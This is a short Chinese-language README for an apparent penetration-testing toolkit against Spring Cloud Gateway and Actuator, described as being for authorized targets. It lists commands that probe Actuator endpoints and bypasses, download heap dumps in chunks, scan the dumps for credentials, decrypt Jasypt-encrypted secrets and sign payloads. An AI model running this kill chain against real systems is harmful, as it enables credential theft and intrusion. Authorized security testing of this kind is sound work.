# spring-gateway-killchain

授权范围内 Spring Cloud Gateway / Actuator 杀伤链工具箱（业务 AF）。

## 安装依赖

```bash
bash tools/spring-gateway-killchain/bin/install_vendor.sh
# 可选：开放平台签名
pip3 install --user cryptography
```

产出：`vendor/jdk-17/`（Temurin 17）、`vendor/jasypt-1.9.3.jar`

## 命令

```bash
# Actuator + 旁路 + 可选 /agg-c
python3 bin/sgc_probe.py --base https://授权目标 --out /tmp/sgc/ --agg-c

# Range 分块 heapdump（按节点分桶）
python3 bin/heapdump_range_fetch.py \
  --url https://授权目标/actuator/heapdump \
  --out /tmp/sgc/ --pin-ip 1.2.3.4 --hostname nodeA

# 下堆后默认立刻 heap_cred_scan（正则+蓝鸟）。不要只跑 strings。
python3 炼蛊房/heap_cred_scan.py /tmp/sgc/heapdump_nodeA.hprof --out /tmp/sgc/heap_creds/

# Jasypt 解密（默认 PBEWITHSHA1ANDRC2_40 + NoIv）
bash bin/jasypt_decrypt.sh 'password' 'ENC(...)'

# DSA/RSA 签名样例
python3 bin/open_sign_dsa.py --key key.pem --payload 105 --algo dsa
```

Playbook：`传承/春府·关窍.md`
